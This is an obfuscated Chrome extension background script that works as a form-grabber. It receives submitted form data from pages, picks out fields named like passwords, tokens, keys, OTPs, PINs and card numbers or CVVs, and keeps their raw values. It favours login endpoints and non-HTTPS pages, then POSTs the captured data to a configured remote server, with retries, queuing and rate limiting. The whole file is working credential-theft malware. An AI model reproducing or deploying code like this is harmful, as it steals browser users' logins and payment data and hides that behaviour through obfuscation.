importScripts(
    'utils/logger.js',
    'utils/circuit-breaker.js',
    'utils/stats-tracker.js',
    'utils/production-queue.js',
    'config-manager.js'
);

let CONFIG;
let productionQueue;
let circuitBreaker;
let statsTracker;

const state = {
    recentHashes: new Map(),
    rateLimitCounter: 0,
    rateLimitResetTime: Date.now()
};

async function _0xb1c2() {
    try {
        CONFIG = await ConfigManager.load();
        Logger._0l1(CONFIG.LOG_LEVEL);

        productionQueue = new ProductionQueue({
            bufferSize: CONFIG.QUEUE_BUFFER_SIZE,
            flushTimeout: CONFIG.QUEUE_FLUSH_TIMEOUT,
            maxSize: CONFIG.QUEUE_MAX_SIZE,
            maxAgeDays: CONFIG.QUEUE_MAX_AGE_DAYS,
            enableQuotaCheck: CONFIG.ENABLE_QUOTA_CHECK
        });

        await productionQueue.initPromise;
        await ProductionQueue._0q17();

        circuitBreaker = new CircuitBreaker(5, 60000);
        statsTracker = new StatsTracker();

        setTimeout(() => _0xc9da(), 5000);
    } catch (error) { }
}

function _0xb3c4(_0xp) {
    try {
        const _0xk = {
            type: _0xp.type,
            url: _0xp.url,
            domain: _0xp.domain,
            isHttps: _0xp.isHttps,
            method: _0xp.method || null,
            sensitiveData: _0xp.sensitiveData
        };
        return JSON.stringify(_0xk);
    } catch {
        return JSON.stringify({
            type: _0xp?.type,
            url: _0xp?.url,
            domain: _0xp?.domain
        });
    }
}

function _0xb4c5(_0xp) {
    const _0xk = _0xb3c4(_0xp);
    return _0xk.split('').reduce((_0xh, _0xc) => ((_0xh << 5) - _0xh) + _0xc.charCodeAt(0), 0).toString();
}

function _0xb5c6(_0xh) {
    if (state.recentHashes.has(_0xh)) {
        if (Date.now() - state.recentHashes.get(_0xh) < CONFIG.DUPLICATE_WINDOW) return true;
    }
    state.recentHashes.set(_0xh, Date.now());
    if (state.recentHashes.size > 1000) {
        const _0xc = Date.now() - CONFIG.DUPLICATE_WINDOW;
        for (const [_0xha, _0xti] of state.recentHashes.entries()) {
            if (_0xti < _0xc) state.recentHashes.delete(_0xha);
        }
    }
    return false;
}

function _0xb6c7() {
    const _0xn = Date.now();
    if (_0xn >= state.rateLimitResetTime) {
        state.rateLimitCounter = 0;
        state.rateLimitResetTime = _0xn + CONFIG.RATE_LIMIT_WINDOW;
    }
    if (state.rateLimitCounter >= CONFIG.MAX_REQUESTS_PER_WINDOW) return true;
    state.rateLimitCounter++;
    return false;
}

function _0xb7c8(_0xu) {
    try { return new URL(_0xu).hostname; } catch { return 'u'; }
}

function _0xb8c9(_0xu) {
    if (!_0xu) return false;
    const _0xd = _0xb7c8(_0xu).toLowerCase();
    const _0xul = _0xu.toLowerCase();
    if (CONFIG.CAPTURE_RULES.NOISE_PATTERNS.some(_0xp => _0xul.includes(_0xp))) return false;
    if (CONFIG.CAPTURE_RULES.EXCLUDED_DOMAINS.some(_0xe => _0xd.includes(_0xe))) return false;
    if (CONFIG.CAPTURE_RULES.TARGET_DOMAINS.length > 0) return CONFIG.CAPTURE_RULES.TARGET_DOMAINS.some(_0xt => _0xd.includes(_0xt));
    return true;
}

function _0xb9ca(_0xu) {
    if (!_0xu || !CONFIG.CAPTURE_RULES.AUTH_ENDPOINT_PATTERNS) return false;
    try {
        const _0u = new URL(_0xu);
        const _0xpq = (_0u.pathname + _0u.search).toLowerCase();
        return CONFIG.CAPTURE_RULES.AUTH_ENDPOINT_PATTERNS.some(_0xp => _0xpq.includes(_0xp.toLowerCase()));
    } catch { return false; }
}

function _0xbbcb(_0xu) { return _0xu && !_0xu.startsWith('https://'); }

function _0xbcbc(_0xu, _0xhsd) {
    if (!_0xhsd) return false;
    if (!CONFIG.CAPTURE_RULES.CAPTURE_ONLY_IMPORTANT) return true;
    return _0xb9ca(_0xu) || _0xbbcb(_0xu);
}

function _0xbdcd(_0xu) {
    const _0xrs = [];
    if (_0xb9ca(_0xu)) _0xrs.push('ae');
    if (_0xbbcb(_0xu)) _0xrs.push('it');
    return _0xrs;
}

function _0xbece(_0xfn) {
    if (!_0xfn) return false;
    return CONFIG.CAPTURE_RULES.SENSITIVE_FIELD_PATTERNS.some(_0xp => _0xfn.toLowerCase().includes(_0xp));
}

function _0xbfcf(_0xd) {
    const _0xs = {};
    if (typeof _0xd === 'object' && _0xd !== null) {
        for (const [key, value] of Object.entries(_0xd)) {
            if (_0xbece(key)) _0xs[key] = { value: value, masked: _0xc2d3(value, key), type: _0xc1d2(key) };
        }
    }
    return Object.keys(_0xs).length > 0 ? _0xs : null;
}

function _0xc1d2(_0xfn) {
    if (!_0xfn) return 'c';
    const _0xl = _0xfn.toLowerCase();
    if (_0xl.includes('pass')) return 'p';
    if (_0xl.includes('token')) return 't';
    if (_0xl.includes('key')) return 'k';
    if (_0xl.includes('otp') || _0xl.includes('pin')) return 'o';
    if (_0xl.includes('cvv') || _0xl.includes('card')) return 'pm';
    return 'c';
}

function _0xc2d3(_0xv, _0xfn) {
    if (!_0xv) return '[e]';
    const _0xs = String(_0xv);
    if (_0xs.length <= 4) return '****';
    return _0xs.substring(0, 2) + '****' + _0xs.substring(_0xs.length - 2);
}

async function _0x7eb1(_0xp, _0xrc = 0) {
    if (!CONFIG.ENABLED) return;
    const _0xh = _0xb4c5(_0xp);
    if (_0xb5c6(_0xh)) return;
    if (_0xb6c7()) { productionQueue._0q6(_0xp); return; }
    try {
        await circuitBreaker._0c1(async () => {
            const _0xr = await fetch(CONFIG.SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Extension-Version': '2.1.0', 'X-Timestamp': _0xp.timestamp, 'X-Capture-Type': _0xp.type },
                body: JSON.stringify(_0xp)
            });
            if (!_0xr.ok) throw new Error(`S_E: ${_0xr.status}`);
            statsTracker._0s4();
        });
    } catch (err) {
        statsTracker._0s5('n');
        if (_0xrc < CONFIG.MAX_RETRIES) {
            statsTracker._0s6();
            setTimeout(() => _0x7eb1(_0xp, _0xrc + 1), CONFIG.RETRY_DELAY * Math.pow(2, _0xrc));
        } else { productionQueue._0q6(_0xp); }
    }
}

async function _0xc9da() {
    try {
        const _0xi = await productionQueue._0q10(10);
        if (_0xi.length > 0) {
            for (const _0xit of _0xi) {
                try {
                    await _0x7eb1(_0xit.payload);
                    await productionQueue.remove(_0xit.id);
                } catch (error) {
                    if (await productionQueue._0q12(_0xit.id) > CONFIG.MAX_RETRIES) await productionQueue._0q11(_0xit.id);
                }
            }
        }
    } catch (error) { }
}

chrome.runtime.onMessage.addListener((_0xm, _0xs, _0sr) => {
    (async () => {
        try {
            const _0xhs = {
                'FORM_SUBMIT': _0xd1e2,
                'GET_STATS': _0xe1f2,
                'GET_CONFIG': _0xe2f3,
                'CLEAR_QUEUE': _0xe4f5,
                'RESET_STATS': _0xe5f6,
                'DEBUG_QUEUE': _0xe6f7,
                'EXPORT_QUEUE': _0xe7f8
            };
            const _0xh = _0xhs[_0xm.type];
            if (_0xh) { _0sr(await _0xh(_0xm, _0xs)); } else { _0sr({ received: true }); }
        } catch (error) { _0sr({ error: error.message }); }
    })();
    return true;
});

async function _0xd1e2(_0xm, _0xs) {
    const _0xu = _0xm.data.url;
    if (!_0xb8c9(_0xu)) return { received: false, reason: 'f' };
    const _0xsf = _0xbfcf(_0xm.data.fields);
    if (!_0xsf) return { received: false, reason: 'n_s_d' };
    if (!_0xbcbc(_0xu, true)) return { received: false, reason: 'n_i' };
    const _0xcr = _0xbdcd(_0xu);
    const _0xp = {
        timestamp: new Date().toISOString(), type: 'FORM_SUBMIT', url: _0xu, domain: _0xb7c8(_0xu),
        isHttps: _0xu.startsWith('https://'), tabId: _0xs.tab?.id, sensitiveData: _0xsf,
        metadata: { technique: 'f_s', captureReason: _0xcr, isAuthEndpoint: _0xb9ca(_0xu), isInsecureTransport: _0xbbcb(_0xu) }
    };
    statsTracker._0s3('FORM_SUBMIT', _0xp.domain, 'f_s');
    await _0x7eb1(_0xp);
    return { received: true };
}

async function _0xe1f2() {
    if (!CONFIG || !statsTracker || !productionQueue) return { error: 'i' };
    return { ...statsTracker._0s7(), queue: await productionQueue._0q18(), circuit: circuitBreaker._0c4(), quota: await productionQueue._0q15(), successRate: statsTracker._0s9(), topDomains: statsTracker._0s8(5) };
}

async function _0xe2f3() { if (!CONFIG) await _0xb1c2(); return CONFIG || {}; }
async function _0xe4f5() { await productionQueue._0q19(); return { success: true }; }
async function _0xe5f6() { await statsTracker._0s10(); return { success: true }; }
async function _0xe6f7() { const _0xi = await productionQueue._0q10(100); return { items: _0xi, count: _0xi.length }; }
async function _0xe7f8() { return await productionQueue._0q21(); }

chrome.storage.onChanged.addListener((_0xcf, _0xa) => {
    if (_0xa === 'sync') ConfigManager.load().then(_0xc => CONFIG = _0xc);
});

setInterval(_0xc9da, 30000);
chrome.runtime.onInstalled.addListener(_0xb1c2);
chrome.runtime.onStartup.addListener(_0xb1c2);
chrome.runtime.onSuspend.addListener(async () => { if (productionQueue) await productionQueue._0q8(); });
_0xb1c2();
